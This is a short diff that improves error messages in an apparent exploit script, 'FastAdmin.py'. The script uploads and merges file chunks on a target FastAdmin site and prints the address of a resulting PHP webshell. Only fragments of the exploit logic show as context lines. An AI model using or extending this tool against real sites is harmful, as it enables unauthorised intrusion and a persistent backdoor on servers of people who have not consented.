@@ -39,6 +39,8 @@ def upload_chunk(url):
 	if result['code'] == 1 and result['msg'] == '' and result['data'] == None:
 		merge_file(upload_url, chunk_id)
 		print('\nWebshell: %s/%d.php' % (url.rstrip('/'), chunk_id))
+	elif result['msg'] != '':
+        print(f"Not Vulnerability, {result['msg']}.")
 	else:
 		print('Not Vulnerability.')
 
@@ -63,8 +65,8 @@ def main():
 		try:
 			headers['Cookie'] = input('Cookie > ')
 			upload_chunk(sys.argv[1])
-		except Exception:
-			print('Not Vulnerability.')
+		except Exception as e:
+			print(e)
 	else:
 		print('Usage: python3 FastAdmin.py url')
 
